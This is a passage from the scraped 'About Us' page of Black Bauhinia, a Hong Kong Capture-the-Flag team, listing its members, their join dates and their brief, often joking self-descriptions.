Oct 2020)      Stdor (Joined Dec 2020)    TC0129 (Joined Feb 2021) - Member of Kiryukai This guy is too lazy to write. Peko.\n     egg (Joined Feb 2021)    cdemirer (Joined Apr 2021) ɒɿbi⑁ວ ni ƨɘƨɿɘvɘЯ - If you have to ask, you\u0026#39;re streets behind.\n     hoifanrd (Joined Apr 2021)    TWY (Joined Apr 2021)      Hollow (Joined Apr 2021) - Mystiz certified Yuu9 member I want to hide on Discord but it seems to fail miserably in iOS version, ᲼᲼᲼᲼᲼᲼.\n   468 (Joined Apr 2021)      bottom (Joined May 2021)    streamline (Joined Jun 2021) I play for free trips (if any) and HTB accounts.\n     Bullet_Farmer (Joined Jun 2021) 55Ge5b63IC0gVGhlIEJ1bGxldCBGYXJtZXI=\n   grhkm (Joined Jul 2021) Just a high school student.\n     Ja5on (Joined Sep 2021) \u0026#34;Without Dream, What\u0026#39;s the Difference between Men And Salted Fish?\u0026#34;\n    Starry Miracle (Joined Sep 2021)      edison497 (Joined Jun 2022) - A mediocre person    HotDawggy (Joined Jun 2022)      fsharp (Joined Dec 2022) CTF player mainly interested in reverse engineering.\n   LifeIsHard (Joined Dec 2022)      J4cky (Joined Dec 2022) An ordinary student who likes CTF and vtuber.\n   RaccoonNinja (Joined Jan 2023) I have no opsec\n     a1668k (Joined Feb 2023) A CTF player who loves trying all categories and watching youtube \u0026amp; twitch\n   ","permalink":"https://b6a.black/about-us/","summary":"Black Bauhinia is a Capture-the-Flag team from Hong Kong founded in 2019 and have been actively participating in CTF games since then. You can find us on CTFtime, Twitter, Facebook, YouTube or Patreon (New!). As you can see, this page is still work-in-progress.\nOur members   harrier (Joined Jul 2019)     cire meat pop (Joined Jul 2019)      Mystiz (Joined Jul 2019) I guess therefore I am.","title":"About Us"}]